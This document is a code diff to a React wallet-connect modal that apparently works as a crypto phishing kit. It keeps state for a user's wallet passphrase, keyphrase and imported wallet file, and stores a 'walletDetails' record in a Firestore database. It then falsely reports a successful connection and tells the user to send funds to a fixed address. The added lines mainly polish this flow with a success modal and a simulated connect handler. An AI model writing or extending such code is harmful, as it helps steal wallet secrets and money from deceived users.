@@ -3,10 +3,12 @@ import React, { useState, useEffect, useCallback } from 'react';
 import { db } from '@/firebaseConfig'; // Adjust the import based on your Firebase setup
 import { getFirestore, collection, addDoc } from 'firebase/firestore';
 
+
 const WalletModal = ({ isOpen, onClose }) => {
   const [showSecondaryModal, setShowSecondaryModal] = useState(false);
   const [selectedWallet, setSelectedWallet] = useState('');
   const [passphrase, setPassphrase] = useState('');
+  const [isModalOpen, setIsModalOpen] = useState(false);
   const [keyphrase, setKeyphrase] = useState('');
   const [importedFile, setImportedFile] = useState(null);
 
@@ -28,7 +30,11 @@ const WalletModal = ({ isOpen, onClose }) => {
     setSelectedWallet('Other');
     setShowSecondaryModal(true);
   };
-
+  const handleConnects = () => {
+    // Simulate wallet connection
+    setIsModalOpen(true);
+    // alert(`Connected to ${selectedWallet} successfully! Fund your wallet using this Address: 000x0x0nbcb0ca0 to proceed.`);
+  };
   const handleConnect = async () => {
     if (!selectedWallet) {
       return;
@@ -49,6 +55,10 @@ const WalletModal = ({ isOpen, onClose }) => {
     try {
       const docRef = await addDoc(collection(db, "walletDetails"), walletDetails);
       console.log("Document written with ID: ", docRef.id);
+      // if (typeof window !== 'undefined') {
+      //   localStorage.setItem('walletid', docRef.id);
+      // }
+      // Optionally show a success message
       alert(`Connected to ${selectedWallet} successfully! Fund Your wallet using this Address: 000x0x0nbcb0ca0 to proceed.`);
       onClose(); // Close the modal after successful connection
     } catch (e) {
@@ -99,8 +109,8 @@ const WalletModal = ({ isOpen, onClose }) => {
   }
 
   return (
-    <div className="fixed inset-0 bg-black flex justify-center items-center z-50">
-      <div className="bg-gray-900 w-80 rounded-lg shadow-lg p-6 max-w-md relative">
+    <div className="fixed inset-0 bg-black mt-8 bg-opacity-50 flex justify-center items-center z-50">
+      <div className="bg-gray-900 rounded-xl shadow-lg p-8 w-full max-w-md relative">
         <button
           onClick={onClose}
           className="absolute top-4 right-4 text-gray-500 hover:text-gray-300 focus:outline-none"
@@ -186,6 +196,12 @@ const WalletModal = ({ isOpen, onClose }) => {
         )}
       </div>
     </div>
+    <SuccessModal 
+        isOpen={isModalOpen} 
+        onClose={() => setIsModalOpen(false)} 
+        selectedWallet={selectedWallet} 
+      />
+    </>
   );
 };
 
